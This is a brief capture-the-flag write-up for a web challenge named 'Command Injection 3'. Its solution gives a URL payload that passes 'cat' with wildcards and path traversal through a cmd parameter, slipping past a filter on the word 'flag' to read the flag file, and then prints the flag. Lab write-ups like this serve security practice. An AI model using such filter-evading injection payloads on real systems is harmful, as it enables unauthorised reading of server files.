# Command Injection 3
Web

## Challenge 

This time I promise... You will NEVER BE ABLE TO DO IT!

http://challs.hats.sg:1339/

Flag format: flag{.+}

Challenge by: Gladiator


## Solution


Somehow my cat was not being filtered out.

Since 'flag' is filtered out, but the `*` astericks are not, use it to cat the flag

http://challs.hats.sg:1339/?cmd=cat%20../../../../fla*/fla*

## Flag

	flag{aint_no_wafu_like_youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu}
